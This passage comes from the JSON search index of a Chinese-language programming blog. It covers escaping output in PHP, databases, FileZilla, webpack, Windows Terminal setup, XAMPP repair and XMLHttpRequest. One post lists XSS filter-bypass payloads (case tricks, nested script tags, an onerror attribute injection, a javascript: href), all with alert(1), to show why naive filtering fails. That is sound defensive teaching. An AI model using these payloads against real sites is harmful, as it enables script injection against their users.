備註：我原本也以為在存到資料庫以前就先做跳脫比較好，但後來課程中提到，建議資料庫存「明碼」會比較好。因為當字串被跳脫成像 &amp;gt; 時，這種格式只有在電腦上能夠解讀，但如果之後要支援 Android 或 IOS 之類的裝置就有可能沒辦法解讀，因此最保險的做法是保留原始的資料格式，最後在輸出的時候做跳脫就好。 最後就附上一下 PHP 的內建跳脫函式用法： 1234// utils.phpfunction escape($unsafe) { return htmlspecialchars($unsafe, ENT_QUOTES);} 接著把所有由使用者輸入的地方都用 escape() 處理後再輸出就安全了： 12345&lt;!-- index.php --&gt;&lt;div class=\"greeting\"&gt;嗨～&lt;?php echo escape($nickname); ?&gt;，今天也來寫點東西吧 (ﾉ&gt;ω&lt;)ﾉ&lt;/div&gt;&lt;div class=\"card__author\"&gt;&lt;?php echo escape($row['nickname']); ?&gt;&lt;/div&gt;&lt;div class=\"card__time\"&gt;&lt;?php echo escape($row['created_at']); ?&gt;&lt;/div&gt;&lt;div class=\"card__text\"&gt;&lt;?php echo escape($row['content']); ?&gt;&lt;/div&gt;","link":"/2022/02/09/what-is-xss/"},{"title":"為什麼要用資料庫？","text":"理解原因就不複雜了。 為什麼要有資料庫？如果不考慮太多，你可能會想說我就開個記事本來存資料就好： 123學生 | 國文 | 數學 | 英文1001 80 60 301002 50 40 80 但這樣做有什麼問題？ 我要找學生我只能一個一個看 我要找某個學生的分數就得用字串函式來處理（例如 split(' ')） 所以是什麼問題？效率問題。 資料庫的初衷為了解決這個問題，有人就開發了「資料庫」系統。 這個系統會提供一個「程式語言」，你可以透過這個程式語言來存取資料，一切都很方便，不用再自己做處理。 拿 SQL 舉例，假設我想找 username 是 PeaNu 的欄位： 1SELECT `id`, `username`, `content`, `created_at` FROM `first` WHERE username = 'PeaNu' 這樣會比我用字串處理來的方便，而且好記又快速。 總之呢，你不用太糾結它底層是怎麼運作的，它其實就是提供一個更方便的介面來讓你做「跟資料有關」的處理。","link":"/2022/01/30/why-database/"},{"title":"為什麼要用 FileZilla？","text":"因為…點進來看吧。 簡述首先來思考一個問題： 當你有一台主機，它不在你家，而是在很遠的某個地方，可是你想把電腦裡的資料傳給它要怎麼辦？ 第一種作法是透過 CLI： 先用 SSH 連到那台虛擬主機，這樣你就可以操控它了 接著回到本地端，把你想要的檔案上傳到某個可以存檔案的平台（例如：Github） 接著再回到虛擬主機，用 git clone 的方式把檔案抓下來 第二種做法是用 FileZilla： 用 FileZilla 提供的介面跟虛擬主機連線（我想底層應該一樣是透過 SSH） 成功連線後，接下來就很直覺了，因為是圖形化介面，你照著畫面摸就能大概摸出個所以然 這裡在示範怎麼把虛擬主機的 index.php 抓到我的電腦裡。 至於為什麼要用 FileZilla？我覺得理由很簡單，因為比較方便，只是這樣子。 可以思考看看用 CLI 有什麼問題？ 每當要上傳一個新的專案就得重新開一個 Repository 過程中得反覆操作 Git 的指令 只是想修改個小地方就得在本地重新 commit，然後再讓虛擬主機 pull 下來 但用 FileZilla 就不用擔心這些了，可以把它當成是一種 Google Cloud 的感覺，真的方便許多。","link":"/2022/03/08/why-filezilla/"},{"title":"為什麼要用 webpack？","text":"到底為什麼呢？ 簡述簡單來說，Webpack 主要是一個用來把「模組」給打包的工具。除了打包，還有一些其他功能，但這邊不會細講。 至於在問能不能不要用 wepback 之前，先思考看看這兩個問題： 你需要考慮瀏覽器支援度嗎？因為並不是所有瀏覽器都支援 ES Modules 你會用到外部套件嗎？像是從 npm 上下載的套件？因為 ES Module 沒辦法直接讓你引入 如果你不需要考慮這些，那你就可以不要用，因為大部分用 webpack 的主要目的是想解決這兩個問題。 接下來，我想先釐清一下關於「模組化」的正確觀念。 過去在瀏覽器上要用套件，通常是透過 src 來引入，例如 jQuery： 12345&lt;!-- jQuery --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt; // 接著在這裡就能用 $ 或 jQuery 來使用&lt;/script&gt; 我要特別強調這個不叫做模組化，為什麼？因為這已經汙染到「全域變數」了。 所謂的模組化，應該要像是在 Node.js 上用 require 的方式來引入套件： 1234// 能夠自己定義模組名稱const myjQuery = require('jquery');// 或是只引入我想要的東西const { ajax } = require('jquery'); OK，到這裡你應該已經理解什麼叫做模組化，接著來回顧一下歷史。 大家都知道在 ES6 推出「ES module」之前，瀏覽器只能透過 src 來引入套件。所以問題來了，在 ES module 推出之前完全就沒辦法用模組嗎？ 不是的，不要忘了前端的那句名言： 瀏覽器沒有支援的東西，就寫一個工具來讓它可以支援就好。 所以就有人寫了 Browserify 來讓你可以在瀏覽器上也用 require 的方式來引入套件，而 webpack 也是從 Browserify 的概念延伸出來的工具，只是它又更強大了一點。 可是你應該會有個疑問，為什麼 ES module 推出後還需要用 webpack 呢？不是瀏覽器就能原生支援嗎？ 這個問題以前我也想很久都搞不懂。不過現在我理解了。 沒錯，ES module 確實是瀏覽器原生支援的東西，可是它有最開始提到的那兩個問題： 瀏覽器支援度，比較舊的瀏覽器不支援 沒辦法引入從 npm 上下載的套件 還有一些其他的小問題，像是得在 &lt;script&gt; 上加 type=module 和得搭配 server 來開發之類的。 總之呢，問題在於ES module 還是沒有那麼方便使用，這個就是用 webpack 最主要的原因了。 所以 webpack 到底好用在哪？不如直接看個示範吧！ 如果我想要引入用 npm 下載的 jquery，我可以開一支檔案來寫 jQuery： 123456789// CommonJSconst myjQuery = require('jquery');myjQuery('body').css('background-color', 'rgba(0, 255, 0, 0.2)');myjQuery('.btn').on('click', () =&gt; console.log('click'));// ES modulesimport jq from 'jquery';jq('body').css('background-color', 'rgba(0, 0, 255, 0.2)');jq('.btn').on('click', () =&gt; console.log('click')); 不管我要在裡面用 CommonJS 或 ES modules 來引入都沒問題。我只要記得寫好後用 webpack 打包，接著在 HTML 裡面加上一句： 12&lt;!-- 打包好的模組 --&gt;&lt;script src=\"./bundle.js\"&gt;&lt;/script&gt; 不需要再 type=module，也不需要開 server，拿去瀏覽器上就是直接可以跑。這個就是 webpack 強大的地方。明明我寫的不是瀏覽器支援的東西，卻可以讓它看起來就像有支援一樣。 為什麼可以這樣？可以想成是 webpack 在瀏覽器上實作了 require 或 import 這兩個 function，這樣比較好理解。 除此之外，webpack 還有更多的功能，像是： 把要引入的 JavaScript 先用 babel 編譯後再打包 明明是在 JS 裡，卻可以引入 CSS，或甚至是 SCSS 跟第一點同理，如果引入的是 SCSS，可以先編譯成 CSS 後再打包 總之這邊不打算細談，只是點出來讓大家知道 webpack 可以做到這些事情而已。 所以為什麼現代前端開發幾乎 90% 都會用 webpack？ 因為它太方便了，很難找到不用它的理由。 沒錯，就是這麼簡單又暴力的答案。","link":"/2022/03/04/why-webpack/"},{"title":"Windows 終端配置 懶人包","text":"記起來方便下次使用。 參考教學：Make Windows Terminal Look Better | Oh My Posh Guide 要安裝的東西 安裝 windows ternimal 安裝你喜歡的 themes 安裝你喜歡的 fonts 安裝 oh my posh（一個 windows ternimal 的插件） windows ternimal 基本設定基本的字型、主題可以在「預設值 &gt; 外觀」的地方設定： 也可以點選左下角的「開啟 JSON 檔案」來透過 .json 來設定，例如： 12345678910\"profiles\": { \"defaults\": { \"backgroundImage\": null, // 背景圖片 \"colorScheme\": \"Dracula\", // 主題 \"font\": { \"face\": \"JetBrainsMono Nerd Font\", // 字型 \"size\": 10.0 // 字體大小 } }} 其他的部分可以自行找出對應的 key 來設定。 設定 oh my posh 主題 執行 Get-PoshThemes 或直接到 官網 挑一個喜歡的主題 拿到設定主題的指令，通常會長得像這樣：oh-my-posh init pwsh --config 'C:\\Users\\user\\AppData\\Local\\Programs\\oh-my-posh\\themes\\&lt;主題名稱&gt;.omp.json' | Invoke-Expression 執行 notepad $PROFILE 打開 shell 的設定檔，再把第二步的指令貼進。（如果出現錯誤，代表你可能還沒有這個檔案，請先執行 New-Item -Path $PROFILE -Type File -Force） 完成上面步驟後，如果重新打開有正確顯示就代表成功了。 安裝 Git 相關插件如果是你用的 shell 是「PowerShell」的話，在使用 git 指令時用 tab 不會像 git bash 一樣有 autocomplete 的功能，所以我參考了這篇 文章 來解決這問題。 首先在終端中執行： 1PowerShellGet\\Install-Module posh-git -Scope CurrentUser -Force 接著到設定檔（可以用 $PROFILE 來查看位置）中加入底下這段就可以了： 1Import-Module posh-git","link":"/2023/06/10/windows-terminal-set-up/"},{"title":"當 XAMPP 的 MySQL 爆掉該怎麼處理","text":"怕之後又踩到這個雷 簡述某天要連線 MySQL 的時候就噴錯誤訊息： 以下的方法我都試過，但都沒成功： How to Fix the XAMPP Error “MySQL Shutdown Unexpectedly” (3 Methods) How to solve “Error: MySQL shutdown unexpectedly”? 但有需要的話還是可以參考一下。 解決辦法 把 xampp/mysql/data 資料夾整個資料夾複製一份 =&gt; xampp/mysql/data-複製 把 xampp/mysql/backup 的內容全部貼到 xampp/mysql/data 把 xampp/mysql/data-複製 的內容全部貼到 xampp/mysql/data，除了 mysql performance_schema phpmyadmin 這幾個資料夾 如果最後 MySQL 可以連線，但還是讀不到原本的資料，再把 xampp/mysql/data-複製 裡面的 ibdata1 貼到 xampp/mysql/data（這個檔案很重要，我就是這樣復原的） 關於第四個步驟我是看這篇才解出來的：MariaDB (MySQL)出現table doesn’t exist in engine錯誤","link":"/2022/02/10/xampp-problem-fix/"},{"title":"XMLHttpRequest 的寫法","text":"覺得太久沒寫的話又會忘記它的寫法。 簡述這邊是用這支 API 來做示範。 GET簡單來說順序一定是這樣： 建立 XHR 實體 打開要請求的 end point 設定拿到回應的 callback 發送 request 失敗的 callback 送出 request 1&lt;button&gt;Send request&lt;/button&gt; 1234567891011121314151617181920212223242526272829303132function sendRequest(url, callback) { // 建立 xhr 實體 const request = new XMLHttpRequest() // 設定 end point 跟 HTTP method request.open('GET', url, true) // 有需要加上 header 的話 request.setRequestHeader('client-id', 'xxxxxx') // 請求成功的 callback request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { callback(null, request.responseText) } else { callback('We reached our target server, but it returned an error') } } // 請求失敗的 callback request.onerror = () =&gt; { callback('There was a connection error of some sort') } // 送出請求 request.send()}// 按下按鈕就發一個 requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } 備註：onerror 的定義是你連 request 都沒有送出去，伺服器根本沒收到的意思。 POST跟剛剛差不多，但要注意 POST 的資料格式： application/json JSON application/x-www-form-urlencoded Form 這邊示範 JSON： 12345678910111213141516171819202122232425262728293031323334353637function sendRequest(url) { return new Promise((resolve, reject) =&gt; { // 要傳送的 JSON 資料 const params = { email: 'aaa123456@gmail.com', gender: 'male', name: 'Jacky', status: 'active' } const request = new XMLHttpRequest() request.open('POST', url, true) request.setRequestHeader('Content-type', 'application/json') request.setRequestHeader('Authorization', 'Bearer xxxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // 最後要記得轉成字串 request.send(JSON.stringify(params)) })}// 按下按鈕就發一個 requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } Form 表單： 12345678910111213141516171819202122232425262728293031function sendRequest(url) { return new Promise((resolve, reject) =&gt; { const request = new XMLHttpRequest() request.open('POST', url, true) // 記得資料格式要填對 request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8') request.setRequestHeader('Authorization', 'Bearer xxxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // 用 queryString 的格式來送資料 request.send('email=bbb123456@gmail.com&amp;gender=male&amp;name=Jacky&amp;status=active') })}// 按下按鈕就發一個 requestconst URL = 'https://gorest.co.in/public/v1/users'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } 或其實也可以用 FormData 來設定資料： 12345678910111213141516171819202122232425262728293031323334353637383940function sendRequest(url) { return new Promise((resolve, reject) =&gt; { let form = new FormData() form.append('email', 'apple123456@gmail.com') form.append('gender', 'male') form.append('name', 'yoyo') form.append('status', 'active') /* 要檢查內容得這樣看 */ /* for (var [key, value] of data.entries()) { // console.log(key, value); } */ const request = new XMLHttpRequest() request.open('POST', url, true) request.setRequestHeader('Authorization', 'Bearer xxxx') request.onload = () =&gt; { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { resolve(request.responseText) } else { reject('We reached our target server, but it returned an error') } } request.onerror = () =&gt; { reject('There was a connection error of some sort') } // 最後把建立好的 form 送出去 request.send(form) })}const URL = 'https://gorest.co.in/public/v1/users/'const button = document.querySelector('button')button.onclick = () =&gt; { sendRequest(URL) .then(data =&gt; console.log(JSON.parse(data))) .catch(err =&gt; console.log(err)) } 備註：我這邊實測會拿到 422 （POST 內容不對）錯誤，但我確認過格式沒錯呀。總之呢，知道能這樣用就好。 補充：為什麼會失敗？ 因為這一段： 1request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded') 如果要用 FormData 來包裝表單，xhr 會自己幫你設定正確的 Content-type，但如果我們自己又加上 header 的話會把原本的給覆寫掉，所以只要拿掉那一段就 OK 了。","link":"/2022/01/29/xhr-usage/"},{"title":"你想不到的 XSS 攻擊方式","text":"想不到吧？ 簡述這是在做完 網站前後端開發基礎測試 後學到的一些小知識，所以想記錄一下。 只過濾 &lt;script&gt; 字串安全嗎？不安全。 我可以改用 &lt;SCRIPT 來避開（HTML 沒有分大小寫） 12345&lt;?php $xss = '&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; 我可以拆成 &lt;scr&lt;script&gt;ipt&gt; 12345&lt;?php $xss = '&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; 我可以寫成 &lt;script type=\"text/javascript\"&gt; 12345&lt;?php $xss = '&lt;script type=\"text/javascript\"&gt;alert(1)&lt;/script&gt;';?&gt;&lt;div&gt;&lt;?php echo str_replace('&lt;script&gt;', '', $xss); ?&gt;&lt;/div&gt; 我可以利用「字串拼接」的方式取代 &lt;script&gt;（跟 SQL Injection 類似） 1234&lt;?php $xss = ' \" onerror=\"alert(1)';?&gt;&lt;img src=\"src\" alt=\"&lt;?php echo $xss; ?&gt;\"&gt; 可惡，那我把可疑字元都過濾掉總安全了吧？不好意思，有個東西叫做「JavaScript pseudo-protocol」，所以不需要那些字元也能執行 JS。 12345&lt;?php $xss = 'javascript: alert(1)';?&gt;// 點下去還是會觸發 xss&lt;a href=\"&lt;?php echo htmlspecialchars($xss); ?&gt;\"&gt;Good Things&lt;/a&gt; 好，目前我知道的就這些，其他等之後碰到了再回來補。不得不說 XSS 的攻擊方式真的有夠多…","link":"/2022/03/15/you-dont-know-xss/"}],"tags":[],"categories":[{"name":"CSS","slug":"CSS","link":"/categories/CSS/"},{"name":"Eleventy","slug":"Eleventy","link":"/categories/Eleventy/"},{"name":"Example","slug":"Example","link":"/categories/Example/"},{"name":"React","slug":"React","link":"/categories/React/"},{"name":"Network","slug":"Network","link":"/categories/Network/"},{"name":"PHP","slug":"PHP","link":"/categories/PHP/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"Node.js","slug":"Node-js","link":"/categories/Node-js/"},{"name":"Antd","slug":"Antd","link":"/categories/Antd/"},{"name":"Plug-in","slug":"Plug-in","link":"/categories/Plug-in/"},{"name":"Information-security","slug":"Information-security","link":"/categories/Information-security/"},{"name":"Algorithm","slug":"Algorithm","link":"/categories/Algorithm/"},{"name":"Bootstrap","slug":"Bootstrap","link":"/categories/Bootstrap/"},{"name":"HTML","slug":"HTML","link":"/categories/HTML/"},{"name":"MySQL","slug":"MySQL","link":"/categories/MySQL/"},{"name":"devtool","slug":"devtool","link":"/categories/devtool/"},{"name":"Command-line","slug":"Command-line","link":"/categories/Command-line/"},{"name":"English","slug":"English","link":"/categories/English/"},{"name":"VS-code","slug":"VS-code","link":"/categories/VS-code/"},{"name":"Next","slug":"Next","link":"/categories/Next/"},{"name":"Git","slug":"Git","link":"/categories/Git/"},{"name":"Programming","slug":"Programming","link":"/categories/Programming/"},{"name":"Computer-science","slug":"Computer-science","link":"/categories/Computer-science/"},{"name":"MindSet","slug":"MindSet","link":"/categories/MindSet/"},{"name":"Express","slug":"Express","link":"/categories/Express/"},{"name":"Firebase","slug":"Firebase","link":"/categories/Firebase/"},{"name":"Shell-script","slug":"Shell-script","link":"/categories/Shell-script/"},{"name":"Heroku","slug":"Heroku","link":"/categories/Heroku/"},{"name":"Others","slug":"Others","link":"/categories/Others/"},{"name":"jQuery","slug":"jQuery","link":"/categories/jQuery/"},{"name":"mentor-program","slug":"mentor-program","link":"/categories/mentor-program/"},{"name":"Vim","slug":"Vim","link":"/categories/Vim/"},{"name":"NPM","slug":"NPM","link":"/categories/NPM/"},{"name":"React Native","slug":"React-Native","link":"/categories/React-Native/"},{"name":"Testing","slug":"Testing","link":"/categories/Testing/"},{"name":"RegExp","slug":"RegExp","link":"/categories/RegExp/"},{"name":"ORM","slug":"ORM","link":"/categories/ORM/"},{"name":"Book","slug":"Book","link":"/categories/Book/"},{"name":"TypeScript","slug":"TypeScript","link":"/categories/TypeScript/"},{"name":"Vue","slug":"Vue","link":"/categories/Vue/"}]}